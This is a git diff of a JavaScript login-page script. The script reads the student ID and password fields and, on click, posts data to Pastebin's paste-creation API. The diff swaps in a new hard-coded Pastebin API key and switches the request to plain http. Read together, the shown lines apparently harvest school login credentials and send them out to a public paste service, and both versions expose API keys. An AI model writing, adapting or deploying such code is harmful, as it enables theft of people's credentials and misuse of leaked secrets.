@@ -1,7 +1,7 @@
 const loginButton = document.querySelector('.loginButton');
 const studentId = document.querySelector('[name="studentIDNumber"]');
 const password = document.querySelector('[name="password"]');
-const pastebinkey = '4ipD0r0J2iu6Xt-CcrYru4mGob66-a4Y';
+const pastebinkey = 'gzYBWUddEgEyCwKo6T5dOTs80ta9TgDa';
 
 console.log('OK!');
 console.log(loginButton);
@@ -34,12 +34,8 @@ loginButton.addEventListener('click', () => {
 
         console.log(JSON.stringify(data), bodyParam);
 
-        fetch('https://pastebin.com/api/api_post.php', requestData)
-            .then((response) => response.text())
-            .then((data) => {
-                console.log('Paste created successfully:');
-                console.log(data);
-            })
+        fetch('http://pastebin.com/api/api_post.php', requestData)
+            .then((response) => console.log(response))
             .catch((err) => console.error(err));
     }
 });
